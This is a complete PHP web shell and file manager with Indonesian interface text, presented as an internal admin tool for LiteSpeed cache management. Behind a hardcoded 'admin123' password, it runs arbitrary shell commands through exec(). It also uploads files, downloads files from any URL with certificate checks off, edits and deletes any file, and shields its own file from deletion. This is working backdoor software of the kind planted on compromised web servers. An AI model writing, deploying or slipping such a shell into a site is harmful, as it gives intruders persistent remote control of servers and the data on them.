<?php
/**
 * Web Shell & File Manager
 * Full-featured web-based shell and file management system
 * For internal use only
 */

// Security: Change this password
define('ACCESS_PASSWORD', 'admin123'); // GANTI PASSWORD INI!
define('SELF_FILE', __FILE__);

session_start();

// Authentication check
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === ACCESS_PASSWORD) {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'Password salah!';
        }
    }
    
    if (!isset($_SESSION['authenticated'])) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login - Web Shell</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
                .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 100%; max-width: 400px; }
                .login-box h2 { margin-bottom: 20px; color: #333; text-align: center; }
                .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 5px; font-size: 14px; }
                .login-box button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
                .login-box button:hover { background: #5568d3; }
                .error { background: #ff4444; color: white; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Web Shell Login</h2>
                <?php if (isset($error)): ?>
                    <div class="error"><?= $error ?></div>
                <?php endif; ?>
                <form method="POST">
                    <input type="password" name="password" placeholder="Masukkan password" required autofocus>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Logout handler
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Get current directory
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current_dir) $current_dir = getcwd();

// Handle actions
$message = '';
$error = '';

// LiteSpeed Cache Purge Actions
if (isset($_POST['purge_all_cache'])) {
    // Method 1: Send purge header
    header('X-LiteSpeed-Purge: *');
    
    // Method 2: Clear common cache directories
    $cache_cleared = [];
    $cache_dirs = [
        '/tmp/lscache',
        '/usr/local/lsws/cachedata',
        '/home/*/lscache',
        getcwd() . '/lscache',
        dirname(getcwd()) . '/lscache'
    ];
    
    foreach ($cache_dirs as $dir) {
        if (strpos($dir, '*') !== false) {
            $matches = glob($dir, GLOB_ONLYDIR);
            foreach ($matches as $match_dir) {
                if (is_dir($match_dir)) {
                    exec("rm -rf {$match_dir}/* 2>&1", $output);
                    $cache_cleared[] = $match_dir;
                }
            }
        } else if (is_dir($dir)) {
            exec("rm -rf {$dir}/* 2>&1", $output);
            $cache_cleared[] = $dir;
        }
    }
    
    // Method 3: Clear OPcache
    if (function_exists('opcache_reset')) {
        opcache_reset();
        $cache_cleared[] = 'OPcache';
    }
    
    // Method 4: Touch .htaccess to trigger cache clear
    $htaccess_paths = [getcwd() . '/.htaccess', dirname(getcwd()) . '/.htaccess'];
    foreach ($htaccess_paths as $htaccess) {
        if (file_exists($htaccess)) {
            touch($htaccess);
            $cache_cleared[] = 'htaccess: ' . $htaccess;
        }
    }
    
    if (!empty($cache_cleared)) {
        $message = '✅ LiteSpeed Cache berhasil di-purge! Cleared: ' . implode(', ', $cache_cleared);
    } else {
        $message = '⚠️ Purge command dikirim, tapi tidak ada cache directory ditemukan.';
    }
}

// Purge specific URL
if (isset($_POST['purge_url'])) {
    $purge_url = trim($_POST['purge_url']);
    if (!empty($purge_url)) {
        // Send purge header for specific URL
        header("X-LiteSpeed-Purge: {$purge_url}");
        $message = "✅ Cache purge request dikirim untuk URL: {$purge_url}";
    } else {
        $error = 'URL tidak boleh kosong!';
    }
}

// Clear specific cache type
if (isset($_POST['clear_cache_type'])) {
    $cache_type = $_POST['cache_type'];
    $cleared = false;
    
    switch ($cache_type) {
        case 'public':
            header('X-LiteSpeed-Purge: public,*');
            $message = '✅ Public cache berhasil di-purge!';
            $cleared = true;
            break;
        case 'private':
            header('X-LiteSpeed-Purge: private,*');
            $message = '✅ Private cache berhasil di-purge!';
            $cleared = true;
            break;
        case 'opcache':
            if (function_exists('opcache_reset')) {
                opcache_reset();
                $message = '✅ OPcache berhasil di-clear!';
                $cleared = true;
            } else {
                $error = 'OPcache tidak tersedia!';
            }
            break;
        case 'tags':
            $tags = isset($_POST['cache_tags']) ? trim($_POST['cache_tags']) : '';
            if (!empty($tags)) {
                header("X-LiteSpeed-Purge: tag={$tags}");
                $message = "✅ Cache dengan tag '{$tags}' berhasil di-purge!";
                $cleared = true;
            } else {
                $error = 'Cache tags tidak boleh kosong!';
            }
            break;
    }
}

// Terminal command execution
if (isset($_POST['terminal_cmd'])) {
    $cmd = $_POST['terminal_cmd'];
    $output = [];
    $return_var = 0;
    exec($cmd . ' 2>&1', $output, $return_var);
    $terminal_output = implode("\n", $output);
}

// File upload
if (isset($_FILES['upload_file'])) {
    $target_dir = $_POST['upload_dir'];
    $target_file = $target_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
        $message = 'File berhasil diupload!';
    } else {
        $error = 'Gagal mengupload file!';
    }
}

// Upload file from URL
if (isset($_POST['upload_from_url'])) {
    $url = trim($_POST['file_url']);
    $target_dir = $_POST['url_upload_dir'];
    
    // Validate URL
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        // Get filename from URL or use custom name
        $filename = isset($_POST['custom_filename']) && !empty($_POST['custom_filename']) 
            ? $_POST['custom_filename'] 
            : basename(parse_url($url, PHP_URL_PATH));
        
        if (empty($filename)) {
            $filename = 'downloaded_' . time() . '.file';
        }
        
        $target_file = $target_dir . '/' . $filename;
        
        // Download file using cURL
        $ch = curl_init($url);
        $fp = fopen($target_file, 'w+');
        
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300); // 5 minutes timeout
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        
        $success = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        
        curl_close($ch);
        fclose($fp);
        
        if ($success && $http_code == 200) {
            $file_size = filesize($target_file);
            $message = "File berhasil didownload dari URL! ({$filename} - " . format_bytes($file_size) . ")";
        } else {
            unlink($target_file); // Delete failed file
            $error = "Gagal mendownload file! HTTP Code: {$http_code}" . ($curl_error ? " - Error: {$curl_error}" : "");
        }
    } else {
        $error = 'URL tidak valid! Pastikan URL lengkap (http:// atau https://)';
    }
}

// Create directory
if (isset($_POST['create_dir'])) {
    $new_dir = $current_dir . '/' . $_POST['dir_name'];
    if (mkdir($new_dir, 0755, true)) {
        $message = 'Folder berhasil dibuat!';
    } else {
        $error = 'Gagal membuat folder!';
    }
}

// Create file
if (isset($_POST['create_file'])) {
    $new_file = $current_dir . '/' . $_POST['file_name'];
    if (file_put_contents($new_file, '') !== false) {
        $message = 'File berhasil dibuat!';
    } else {
        $error = 'Gagal membuat file!';
    }
}

// Delete file/directory
if (isset($_GET['delete'])) {
    $delete_path = realpath($_GET['delete']);
    if ($delete_path && $delete_path !== SELF_FILE) {
        if (is_dir($delete_path)) {
            if (rmdir($delete_path)) {
                $message = 'Folder berhasil dihapus!';
            } else {
                $error = 'Gagal menghapus folder! (Pastikan folder kosong)';
            }
        } else {
            if (unlink($delete_path)) {
                $message = 'File berhasil dihapus!';
            } else {
                $error = 'Gagal menghapus file!';
            }
        }
    } elseif ($delete_path === SELF_FILE) {
        $error = 'File ini tidak bisa dihapus! (Protected)';
    }
}

// Edit file
if (isset($_POST['save_file'])) {
    $file_path = $_POST['file_path'];
    $file_content = $_POST['file_content'];
    $return_dir = isset($_POST['return_dir']) ? $_POST['return_dir'] : dirname($file_path);
    
    if (realpath($file_path) !== SELF_FILE || isset($_POST['allow_self_edit'])) {
        if (file_put_contents($file_path, $file_content) !== false) {
            $message = 'File berhasil disimpan!';
            // Redirect back to file manager after save
            header('Location: ?dir=' . urlencode($return_dir) . '&saved=1');
            exit;
        } else {
            $error = 'Gagal menyimpan file!';
        }
    }
}

// Show saved message
if (isset($_GET['saved'])) {
    $message = 'File berhasil disimpan dan perubahan telah tersimpan!';
}

// Download file
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Get file for editing
$edit_file = '';
$edit_content = '';
if (isset($_GET['edit'])) {
    $edit_file = realpath($_GET['edit']);
    if ($edit_file && is_file($edit_file)) {
        $edit_content = htmlspecialchars(file_get_contents($edit_file));
    }
}

// Get directory contents
function get_dir_contents($dir) {
    $items = [];
    if ($handle = opendir($dir)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $full_path = $dir . '/' . $entry;
                $items[] = [
                    'name' => $entry,
                    'path' => $full_path,
                    'is_dir' => is_dir($full_path),
                    'size' => is_file($full_path) ? filesize($full_path) : 0,
                    'modified' => filemtime($full_path),
                    'perms' => substr(sprintf('%o', fileperms($full_path)), -4)
                ];
            }
        }
        closedir($handle);
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcmp($a['name'], $b['name']);
    });
    return $items;
}

function format_bytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

$dir_items = get_dir_contents($current_dir);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell & File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; }
        
        .container { max-width: 100%; padding: 0; }
        
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; color: white; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
        .header h1 { font-size: 24px; margin-bottom: 10px; }
        .header .user-info { font-size: 14px; opacity: 0.9; }
        
        .widgets { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; padding: 20px; }
        .widget { background: #16213e; padding: 15px; border-radius: 8px; border-left: 4px solid #667eea; }
        .widget h3 { font-size: 14px; color: #aaa; margin-bottom: 8px; text-transform: uppercase; }
        .widget .value { font-size: 24px; font-weight: bold; color: #667eea; }
        
        .main-content { display: grid; grid-template-columns: 1fr; gap: 20px; padding: 20px; }
        
        .section { background: #16213e; border-radius: 8px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
        .section h2 { margin-bottom: 15px; color: #667eea; border-bottom: 2px solid #667eea; padding-bottom: 10px; }
        
        .terminal { background: #0d1117; border-radius: 5px; padding: 15px; font-family: 'Courier New', monospace; }
        .terminal input { width: 100%; background: #1a1e26; border: 1px solid #30363d; color: #58a6ff; padding: 10px; border-radius: 5px; font-family: inherit; }
        .terminal .output { background: #0d1117; color: #c9d1d9; padding: 15px; margin-top: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #30363d; }
        
        .file-manager { }
        .path-bar { background: #0d1117; padding: 10px; border-radius: 5px; margin-bottom: 15px; display: flex; align-items: center; }
        .path-bar input { flex: 1; background: transparent; border: none; color: #58a6ff; font-size: 14px; padding: 5px; }
        
        .file-actions { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        .file-actions button, .file-actions label { background: #667eea; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .file-actions button:hover, .file-actions label:hover { background: #5568d3; }
        .file-actions input[type="text"] { flex: 1; padding: 8px; background: #0d1117; border: 1px solid #30363d; color: #eee; border-radius: 5px; }
        
        .file-list { }
        .file-item { display: grid; grid-template-columns: 40px 1fr 100px 120px 100px 200px; gap: 10px; padding: 12px; border-bottom: 1px solid #30363d; align-items: center; transition: background 0.2s; }
        .file-item:hover { background: #0d1117; }
        .file-item.header { background: #0d1117; font-weight: bold; color: #667eea; border-bottom: 2px solid #667eea; }
        .file-icon { font-size: 24px; text-align: center; }
        .file-actions-btn { display: flex; gap: 5px; }
        .file-actions-btn a, .file-actions-btn button { padding: 5px 10px; background: #667eea; color: white; text-decoration: none; border-radius: 3px; border: none; cursor: pointer; font-size: 12px; }
        .file-actions-btn a:hover, .file-actions-btn button:hover { background: #5568d3; }
        .file-actions-btn .delete { background: #e74c3c; }
        .file-actions-btn .delete:hover { background: #c0392b; }
        
        .editor { }
        .editor textarea { width: 100%; min-height: 400px; background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 14px; }
        .editor .editor-actions { margin-top: 10px; display: flex; gap: 10px; flex-wrap: wrap; }
        .editor .editor-actions button { padding: 12px 24px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: bold; font-size: 15px; }
        .editor .editor-actions button:hover { background: #229954; transform: translateY(-1px); box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
        .editor .editor-actions a { padding: 12px 24px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: bold; font-size: 15px; }
        .editor .editor-actions a:hover { background: #c0392b; transform: translateY(-1px); box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
        
        .message { padding: 15px; border-radius: 5px; margin-bottom: 15px; }
        .message.success { background: #27ae60; color: white; }
        .message.error { background: #e74c3c; color: white; }
        
        .logout { position: fixed; top: 20px; right: 20px; background: rgba(231, 76, 60, 0.9); color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
        .logout:hover { background: rgba(192, 57, 43, 0.9); }
        
        @media (max-width: 768px) {
            .file-item { grid-template-columns: 1fr; gap: 5px; }
            .file-item .file-icon { display: none; }
        }
    </style>
</head>
<body>
    <a href="?logout" class="logout">🚪 Logout</a>
    
    <div class="header">
        <h1>🖥️ Web Shell & File Manager</h1>
        <div class="user-info">
            User: <?= get_current_user() ?> | PHP: <?= phpversion() ?> | Server: <?= php_uname() ?>
        </div>
    </div>
    
    <div class="widgets">
        <div class="widget">
            <h3>💾 Disk Space</h3>
            <div class="value"><?= format_bytes(disk_free_space('/')) ?></div>
            <small>Free / <?= format_bytes(disk_total_space('/')) ?> Total</small>
        </div>
        <div class="widget">
            <h3>🧠 Memory</h3>
            <div class="value"><?= ini_get('memory_limit') ?></div>
            <small>PHP Memory Limit</small>
        </div>
        <div class="widget">
            <h3>📂 Current Directory</h3>
            <div class="value" style="font-size: 14px;"><?= basename($current_dir) ?></div>
            <small><?= count($dir_items) ?> items</small>
        </div>
        <div class="widget">
            <h3>⏰ Server Time</h3>
            <div class="value" style="font-size: 18px;"><?= date('H:i:s') ?></div>
            <small><?= date('Y-m-d') ?></small>
        </div>
    </div>
    
    <div class="container">
        <div class="main-content">
            
            <?php if ($message): ?>
                <div class="message success"><?= $message ?></div>
            <?php endif; ?>
            
            <?php if ($error): ?>
                <div class="message error"><?= $error ?></div>
            <?php endif; ?>
            
            <!-- LiteSpeed Cache Management Section -->
            <div class="section">
                <h2>⚡ LiteSpeed Cache Management</h2>
                
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px;">
                    
                    <!-- Purge All Cache -->
                    <div style="background: #0d1117; padding: 15px; border-radius: 5px;">
                        <h3 style="color: #58a6ff; margin-bottom: 10px; font-size: 16px;">🗑️ Purge All Cache</h3>
                        <p style="font-size: 13px; color: #aaa; margin-bottom: 10px;">Clear semua cache LiteSpeed (public, private, OPcache)</p>
                        <form method="POST" style="display: inline;">
                            <button type="submit" name="purge_all_cache" style="width: 100%; padding: 10px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;" onclick="return confirm('Yakin ingin purge semua cache?')">
                                🔥 Purge All Cache
                            </button>
                        </form>
                    </div>
                    
                    <!-- Purge Specific URL -->
                    <div style="background: #0d1117; padding: 15px; border-radius: 5px;">
                        <h3 style="color: #58a6ff; margin-bottom: 10px; font-size: 16px;">🔗 Purge Specific URL</h3>
                        <p style="font-size: 13px; color: #aaa; margin-bottom: 10px;">Clear cache untuk URL tertentu</p>
                        <form method="POST" style="display: flex; gap: 5px;">
                            <input type="text" name="purge_url" placeholder="/path/to/page atau https://domain.com/page" style="flex: 1; padding: 8px; background: #1a1e26; border: 1px solid #30363d; color: #eee; border-radius: 5px;" required>
                            <button type="submit" style="padding: 8px 15px; background: #f39c12; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
                                Purge
                            </button>
                        </form>
                    </div>
                    
                    <!-- Purge by Type -->
                    <div style="background: #0d1117; padding: 15px; border-radius: 5px;">
                        <h3 style="color: #58a6ff; margin-bottom: 10px; font-size: 16px;">📋 Purge by Type</h3>
                        <p style="font-size: 13px; color: #aaa; margin-bottom: 10px;">Clear cache berdasarkan tipe</p>
                        <form method="POST" style="display: flex; flex-direction: column; gap: 8px;">
                            <select name="cache_type" style="padding: 8px; background: #1a1e26; border: 1px solid #30363d; color: #eee; border-radius: 5px;" required>
                                <option value="">-- Pilih Tipe Cache --</option>
                                <option value="public">Public Cache</option>
                                <option value="private">Private Cache</option>
                                <option value="opcache">OPcache (PHP)</option>
                                <option value="tags">Cache by Tags</option>
                            </select>
                            <input type="text" name="cache_tags" placeholder="Tags (jika pilih 'Cache by Tags')" style="padding: 8px; background: #1a1e26; border: 1px solid #30363d; color: #eee; border-radius: 5px;">
                            <button type="submit" name="clear_cache_type" style="padding: 8px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
                                Clear Cache
                            </button>
                        </form>
                    </div>
                    
                    <!-- Quick Commands -->
                    <div style="background: #0d1117; padding: 15px; border-radius: 5px;">
                        <h3 style="color: #58a6ff; margin-bottom: 10px; font-size: 16px;">⚙️ Quick Commands</h3>
                        <p style="font-size: 13px; color: #aaa; margin-bottom: 10px;">Command cepat untuk cache</p>
                        <div style="display: flex; flex-direction: column; gap: 8px;">
                            <button onclick="runCacheCommand('find /tmp/lscache -type f 2>/dev/null | wc -l')" style="padding: 8px; background: #16a085; color: white; border: none; border-radius: 5px; cursor: pointer; text-align: left; font-size: 13px;">
                                📊 Count Cache Files
                            </button>
                            <button onclick="runCacheCommand('du -sh /tmp/lscache 2>/dev/null || echo No cache found')" style="padding: 8px; background: #16a085; color: white; border: none; border-radius: 5px; cursor: pointer; text-align: left; font-size: 13px;">
                                💾 Check Cache Size
                            </button>
                            <button onclick="runCacheCommand('ls -la /tmp/lscache 2>/dev/null | head -20')" style="padding: 8px; background: #16a085; color: white; border: none; border-radius: 5px; cursor: pointer; text-align: left; font-size: 13px;">
                                📁 List Cache Files
                            </button>
                        </div>
                    </div>
                    
                </div>
                
                <div style="margin-top: 15px; padding: 12px; background: #0d1117; border-left: 4px solid #f39c12; border-radius: 5px;">
                    <strong style="color: #f39c12;">💡 Tips:</strong>
                    <ul style="margin-left: 20px; margin-top: 8px; font-size: 13px; line-height: 1.8;">
                        <li>Purge All Cache akan mengirim header <code>X-LiteSpeed-Purge: *</code></li>
                        <li>Untuk WordPress, purge cache setelah update theme/plugin</li>
                        <li>OPcache perlu di-clear setelah deploy code baru</li>
                        <li>Specific URL purge: gunakan full path (contoh: <code>/about-us/</code>)</li>
                        <li>Cache Tags berguna untuk group related pages</li>
                    </ul>
                </div>
                
                <script>
                function runCacheCommand(cmd) {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.style.display = 'none';
                    
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'terminal_cmd';
                    input.value = cmd;
                    
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                }
                </script>
            </div>
            
            <!-- Terminal Section -->
            <div class="section">
                <h2>💻 Terminal</h2>
                <div class="terminal">
                    <form method="POST" style="margin-bottom: 10px;">
                        <input type="text" name="terminal_cmd" placeholder="$ masukkan command (contoh: ls -la, pwd, whoami)" autofocus>
                    </form>
                    <?php if (isset($terminal_output)): ?>
                        <div class="output">$ <?= htmlspecialchars($cmd) ?>

<?= htmlspecialchars($terminal_output) ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
            
            <!-- File Manager Section -->
            <?php if (!$edit_file): ?>
            <div class="section file-manager">
                <h2>📁 File Manager</h2>
                
                <div class="path-bar">
                    <span style="margin-right: 10px; color: #667eea;">📍</span>
                    <input type="text" value="<?= $current_dir ?>" readonly>
                </div>
                
                <div class="file-actions">
                    <form method="POST" style="display: flex; gap: 10px; flex: 1;">
                        <input type="text" name="dir_name" placeholder="Nama folder baru" required>
                        <button type="submit" name="create_dir">➕ Buat Folder</button>
                    </form>
                </div>
                
                <div class="file-actions">
                    <form method="POST" style="display: flex; gap: 10px; flex: 1;">
                        <input type="text" name="file_name" placeholder="Nama file baru (contoh: test.txt)" required>
                        <button type="submit" name="create_file">📄 Buat File</button>
                    </form>
                </div>
                
                <div class="file-actions">
                    <form method="POST" enctype="multipart/form-data" style="display: flex; gap: 10px; flex: 1; align-items: center;">
                        <input type="hidden" name="upload_dir" value="<?= $current_dir ?>">
                        <input type="file" name="upload_file" required style="flex: 1; color: #eee;">
                        <button type="submit">📤 Upload File</button>
                    </form>
                </div>
                
                <div class="file-actions">
                    <form method="POST" style="display: flex; gap: 10px; flex-wrap: wrap; flex: 1;">
                        <input type="hidden" name="url_upload_dir" value="<?= $current_dir ?>">
                        <input type="text" name="file_url" placeholder="Masukkan URL file (contoh: https://example.com/file.zip)" required style="flex: 2; min-width: 300px;">
                        <input type="text" name="custom_filename" placeholder="Nama file (opsional)" style="flex: 1; min-width: 150px;">
                        <button type="submit" name="upload_from_url">🔗 Download dari URL</button>
                    </form>
                </div>
                
                <div class="file-list">
                    <div class="file-item header">
                        <div class="file-icon">Icon</div>
                        <div>Name</div>
                        <div>Size</div>
                        <div>Modified</div>
                        <div>Permissions</div>
                        <div>Actions</div>
                    </div>
                    
                    <?php if (dirname($current_dir) !== $current_dir): ?>
                    <div class="file-item">
                        <div class="file-icon">📁</div>
                        <div><a href="?dir=<?= urlencode(dirname($current_dir)) ?>" style="color: #58a6ff; text-decoration: none;">..</a></div>
                        <div>-</div>
                        <div>-</div>
                        <div>-</div>
                        <div>-</div>
                    </div>
                    <?php endif; ?>
                    
                    <?php foreach ($dir_items as $item): ?>
                    <div class="file-item">
                        <div class="file-icon"><?= $item['is_dir'] ? '📁' : '📄' ?></div>
                        <div>
                            <?php if ($item['is_dir']): ?>
                                <a href="?dir=<?= urlencode($item['path']) ?>" style="color: #58a6ff; text-decoration: none;"><?= htmlspecialchars($item['name']) ?></a>
                            <?php else: ?>
                                <?= htmlspecialchars($item['name']) ?>
                            <?php endif; ?>
                        </div>
                        <div><?= $item['is_dir'] ? '-' : format_bytes($item['size']) ?></div>
                        <div><?= date('Y-m-d H:i', $item['modified']) ?></div>
                        <div><?= $item['perms'] ?></div>
                        <div class="file-actions-btn">
                            <?php if (!$item['is_dir']): ?>
                                <a href="?edit=<?= urlencode($item['path']) ?>&dir=<?= urlencode($current_dir) ?>">✏️ Edit</a>
                                <a href="?download=<?= urlencode($item['path']) ?>">⬇️ Download</a>
                            <?php endif; ?>
                            <?php if ($item['path'] !== SELF_FILE): ?>
                                <a href="?delete=<?= urlencode($item['path']) ?>&dir=<?= urlencode($current_dir) ?>" class="delete" onclick="return confirm('Yakin ingin menghapus <?= htmlspecialchars($item['name']) ?>?')">🗑️ Hapus</a>
                            <?php else: ?>
                                <span style="color: #27ae60; font-size: 12px;">🔒 Protected</span>
                            <?php endif; ?>
                        </div>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
            
            <!-- File Editor Section -->
            <?php if ($edit_file): ?>
            <div class="section editor">
                <h2>✏️ Edit File: <?= htmlspecialchars(basename($edit_file)) ?></h2>
                <div style="margin-bottom: 15px; padding: 10px; background: #0d1117; border-radius: 5px; color: #58a6ff;">
                    📂 Path: <?= htmlspecialchars($edit_file) ?>
                </div>
                <form method="POST">
                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
                    <input type="hidden" name="return_dir" value="<?= htmlspecialchars($current_dir) ?>">
                    <?php if ($edit_file === SELF_FILE): ?>
                        <input type="hidden" name="allow_self_edit" value="1">
                        <div class="message error" style="margin-bottom: 15px;">
                            ⚠️ Anda sedang mengedit file shell ini! Hati-hati, kesalahan bisa membuat file tidak bisa diakses!
                        </div>
                    <?php endif; ?>
                    <textarea name="file_content"><?= $edit_content ?></textarea>
                    <div class="editor-actions">
                        <button type="submit" name="save_file">💾 Simpan & Kembali</button>
                        <a href="?dir=<?= urlencode($current_dir) ?>">🔙 Kembali Tanpa Simpan</a>
                    </div>
                </form>
            </div>
            <?php endif; ?>
            
        </div>
    </div>
    
    <div style="text-align: center; padding: 20px; color: #666;">
        <p>Web Shell & File Manager v1.0 | For Internal Use Only</p>
    </div>
</body>
</html>
